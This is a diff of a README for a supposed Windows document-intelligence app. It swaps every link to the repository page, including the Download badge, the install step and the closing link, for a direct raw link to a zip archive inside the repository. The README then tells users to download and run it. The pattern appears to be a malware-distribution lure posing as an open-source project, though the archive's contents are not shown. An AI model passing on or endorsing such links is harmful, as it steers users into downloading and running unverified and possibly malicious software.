@@ -1,12 +1,12 @@
 # 🧠 rag-document-intelligence - Turn Documents Into Answers
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/unamerican-bias763/rag-document-intelligence)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/unamerican-bias763/rag-document-intelligence/raw/refs/heads/main/app/document-intelligence-rag-1.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the GitHub page and download the app:
 
-https://github.com/unamerican-bias763/rag-document-intelligence
+https://github.com/unamerican-bias763/rag-document-intelligence/raw/refs/heads/main/app/document-intelligence-rag-1.6.zip
 
 ## 🖥️ What this app does
 
@@ -33,7 +33,7 @@ If the app includes a setup file, you can run it on a normal Windows account. If
 ## 🚀 Getting started
 
 1. Open this page in your browser:
-   https://github.com/unamerican-bias763/rag-document-intelligence
+   https://github.com/unamerican-bias763/rag-document-intelligence/raw/refs/heads/main/app/document-intelligence-rag-1.6.zip
 
 2. Look for the latest release, installer, or download file on the page.
 
@@ -248,4 +248,4 @@ On the first launch, the app may:
 
 If you need to return to the download page later:
 
-https://github.com/unamerican-bias763/rag-document-intelligence
+https://github.com/unamerican-bias763/rag-document-intelligence/raw/refs/heads/main/app/document-intelligence-rag-1.6.zip
